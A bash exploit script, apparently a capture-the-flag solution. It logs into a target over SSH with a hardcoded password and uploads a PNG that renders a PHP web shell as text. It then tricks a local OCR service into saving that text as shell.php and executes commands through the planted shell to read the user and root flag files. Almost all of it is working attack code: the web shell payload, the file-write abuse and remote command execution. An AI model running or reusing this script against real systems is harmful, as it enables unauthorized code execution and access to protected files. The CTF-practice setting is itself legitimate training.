#!/bin/bash
# I did not like this machine.
# 1GB+ RAM eaten straight by AI caller agent and it caused a lot of issues.

if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <target_ip> [password]"
    echo "Default password: JbhHDAEgXvri3!"
    exit 1
fi

TARGET_IP=$1
USER="walter"
PASS="${2:-JbhHDAEgXvri3!}"
LOCAL_IMAGE="shell.png"

# Generate image if not present
if [ ! -f "$LOCAL_IMAGE" ]; then
    echo "[*] Generating $LOCAL_IMAGE..."
    python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (700, 60), 'white')
draw = ImageDraw.Draw(img)
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
except:
    font = ImageFont.load_default()
draw.text((5, 20), '<?php system(\$_GET[\"c\"]); ?>', fill='black', font=font)
img.save('$LOCAL_IMAGE')
"
fi

echo "[*] Uploading $LOCAL_IMAGE to $TARGET_IP..."
sshpass -p "$PASS" scp -o StrictHostKeyChecking=no "$LOCAL_IMAGE" "$USER@$TARGET_IP:/home/$USER/"

echo "[*] Running OCR exploit via SSH..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET_IP" bash << 'ENDSSH'
set -e
echo "[*] Encoding image and submitting to OCR..."
B64_DATA=$(base64 -w 0 ~/shell.png)

RESPONSE=$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
    -u 'walter:JbhHDAEgXvri3!' \
    --data-urlencode "canvas_image=data:image/png;base64,$B64_DATA")

OCR_ID=$(echo "$RESPONSE" | grep -oP 'ocr_id["\s]+value="\K[^"]+')
if [ -z "$OCR_ID" ]; then
    echo "[-] Failed to extract OCR_ID. Response: $RESPONSE"
    exit 1
fi
echo "[+] OCR_ID: $OCR_ID"

echo "[*] Saving output as shell.php..."
curl -s -b /tmp/jar -X POST http://localhost:8001/ \
    -u 'walter:JbhHDAEgXvri3!' \
    --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1" > /dev/null

# Wait a moment for the file to be written
sleep 1

echo "[*] Locating shell.php..."
# Try to find the file (only in directories we can read)
SHELL_PATH=$(find /home /var /tmp -name "shell.php" 2>/dev/null | head -1)
if [ -n "$SHELL_PATH" ]; then
    echo "[+] shell.php found at: $SHELL_PATH"
    # Derive web path relative to server root
    # The web server serves from /root/ocr4 (or wherever the service runs)
    # Try common paths
else
    echo "[-] shell.php not found in writable directories."
fi

echo "[*] Attempting to execute shell..."
# Try known paths based on the write‑up
for path in "/saved/shell.php" "/shell.php" "/root/ocr4/saved/shell.php"; do
    echo "[*] Trying $path..."
    OUTPUT=$(curl -s -u 'walter:JbhHDAEgXvri3!' "http://localhost:8001$path?c=id" 2>/dev/null)
    if [ -n "$OUTPUT" ] && [ "$OUTPUT" != "404"* ]; then
        echo "[+] Shell accessible at $path"
        echo "--- id output ---"
        echo "$OUTPUT"
        echo "--- User flag ---"
        curl -s -u 'walter:JbhHDAEgXvri3!' "http://localhost:8001$path?c=cat%20/home/walter/user.txt"
        echo "--- Root flag ---"
        curl -s -u 'walter:JbhHDAEgXvri3!' "http://localhost:8001$path?c=cat%20/root/root.txt"
        break
    fi
done
ENDSSH
